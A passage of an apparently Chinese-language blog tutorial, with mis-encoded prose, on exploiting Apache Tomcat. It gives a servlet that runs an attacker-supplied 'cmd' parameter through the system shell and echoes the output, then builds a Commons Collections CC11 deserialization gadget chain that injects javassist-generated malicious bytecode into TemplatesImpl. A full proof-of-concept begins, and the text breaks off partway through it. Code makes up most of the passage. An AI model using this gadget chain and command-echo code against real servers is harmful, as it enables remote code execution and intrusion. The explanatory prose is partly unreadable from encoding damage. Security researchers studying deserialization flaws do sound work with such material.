class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Echo.java</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Echo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationDispatcher</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> applicationDispatcher.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// åˆ©ç”¨åå°„ä¿®æ”¹ final å˜é‡ ï¼Œä¸è¿™ä¹ˆè®¾ç½®æ— æ³•ä¿®æ”¹ final çš„å±æ€§</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>).getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line">            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(applicationFilterChain);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(applicationFilterChain);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> lastServicedRequest!=<span class="literal">null</span> ? lastServicedRequest.get().getParameter(<span class="string">&quot;cmd&quot;</span>):<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> lastServicedResponse.get().getWriter();</span><br><span class="line">                writer.write(output);</span><br><span class="line">                writer.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨lastServicedRequest.get()è·å–requestè¯·æ±‚ï¼Œå°†ç»“æœå†™å…¥lastServicedResponseè¿›è¡Œå›æ˜¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102133628109.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102133628109.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="CCæ³¨å…¥Tomcat"><a href="#CCæ³¨å…¥Tomcat" class="headerlink" title="CCæ³¨å…¥Tomcat"></a>CCæ³¨å…¥Tomcat</h2><p>ä¸Šé¢çš„æµ‹è¯•æ˜¯äº‹å…ˆæœåŠ¡å™¨å°±å†™å¥½äº†POCä¹Ÿå°±æ˜¯Echoç±»ã€‚ä½†é€šå¸¸æ¼æ´å…¥å£ç‚¹æ˜¯ååºåˆ—åŒ–ï¼Œè€Œä¸èƒ½ç›´æ¥å†™æ–‡ä»¶</p><p>æ ¹æ®ç›®æ ‡æœåŠ¡å™¨çš„CCç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„ååºåˆ—åŒ–é“¾è¿›è¡Œæ³¨å…¥ã€‚è€Œæ³¨å…¥å­—èŠ‚ç ä¸€èˆ¬æ˜¯æœ€é€šç”¨çš„ã€‚</p><p>ç”¨åˆ°å­—èŠ‚ç çš„CCé“¾ï¼ŒCC11çš„é™åˆ¶å¾ˆå°‘ã€‚</p><p>ç‰ˆæœ¬é™åˆ¶ï¼šCommonsCollections3.1-3.2.1  JDKæ— ç‰ˆæœ¬é™åˆ¶</p><h3 id="cc11ï¼ˆå¯è·³è¿‡ç›´æ¥ç”¨POCï¼‰"><a href="#cc11ï¼ˆå¯è·³è¿‡ç›´æ¥ç”¨POCï¼‰" class="headerlink" title="cc11ï¼ˆå¯è·³è¿‡ç›´æ¥ç”¨POCï¼‰"></a>cc11ï¼ˆå¯è·³è¿‡ç›´æ¥ç”¨POCï¼‰</h3><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.io.objectInputstream.readObject() -&gt;</span><br><span class="line">java.util.Hashset.readobject() -&gt;</span><br><span class="line">java.util.HashMap.put() -&gt;</span><br><span class="line">java.util.HashMap.hash() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getvalue() -&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() -&gt;</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt;</span><br><span class="line">java.lang.reflect.Method.invoke()</span><br><span class="line">... templates gadgets ...</span><br><span class="line">java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¥é“¾æœ€åé€šè¿‡InvokerTransformerè°ƒç”¨newTransformeråŠ è½½æ¶æ„å­—èŠ‚ç ã€‚æœ€å¼€å§‹åˆå§‹åŒ–éšä¾¿ä¼ å…¥ä¸€ä¸ªæ–¹æ³•ï¼Œæœ€åé€šè¿‡Field#setä¿®æ”¹transformä¸ºnewTransformã€‚è¿™æ˜¯ä¸ºäº†é¿å…åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å…¶ä»–åœ°æ–¹æå‰è§¦å‘äº†é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨javasiståŠ¨æ€ç”Ÿæˆæ¶æ„å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨javasiståŠ¨æ€åˆ›å»ºæ¶æ„å­—èŠ‚ç </span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">cc.setName(randomClassName);</span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™å…¥.class æ–‡ä»¶</span></span><br><span class="line"><span class="comment">// å°†æˆ‘çš„æ¶æ„ç±»è½¬æˆå­—èŠ‚ç ï¼Œå¹¶ä¸”åå°„è®¾ç½® bytecodes</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f0.set(templates,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put() -&gt;</span><br><span class="line">java.util.HashMap.hash() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getvalue() -&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() -&gt;</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt;</span><br><span class="line">java.lang.reflect.Method.invoke()</span><br></pre></td></tr></table></figure><p>éƒ½æ˜¯CC6çš„å†…å®¹ã€‚å®ä¾‹åŒ–TiedMapEntryå¹¶å°†ç”Ÿæˆçš„æ¶æ„å­—èŠ‚ç ä¼ å…¥ï¼Œå¾—åˆ°tiedmapæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates); </span><br></pre></td></tr></table></figure><p>HashMap#putå¦‚ä¸‹:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145605133.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145605133.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145636276.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145636276.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœkeyå¯æ§ï¼Œå°±ä¼šè°ƒç”¨key.hashCode()</p><p>åœ¨HashSet#readObjectä¸­ï¼Œeæ˜¯sçš„ååºåˆ—åŒ–ï¼Œè°ƒç”¨äº†map.put</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145837203.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145837203.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œçš„så°±æ˜¯é€šè¿‡åºåˆ—åŒ–ObjectOutputStreamå¾—åˆ°çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102150042436.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102150042436.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥æ„é€ æ¶æ„keyè¿›è¡Œååºåˆ—åŒ–</p><p>å…ˆåˆ©ç”¨HashSetæ„é€ å‡½æ•°è·å–åˆå§‹map</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102151016347.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102151016347.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨åˆå§‹hashsetåå°„è·å–mapï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br></pre></td></tr></table></figure><p>mapä¸èƒ½ç”¨çš„æ—¶å€™ç”¨tableï¼Œæ”¾å…¥tiedmap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">keyField.set(node,tiedmap);</span><br></pre></td></tr></table></figure><p>æœ€åå°†transformçš„iMethodNameä¿®æ”¹ä¸ºTemplatesImplå…¥å£newtransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ©ç”¨javasiståŠ¨æ€åˆ›å»ºæ¶æ„å­—èŠ‚ç </span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span 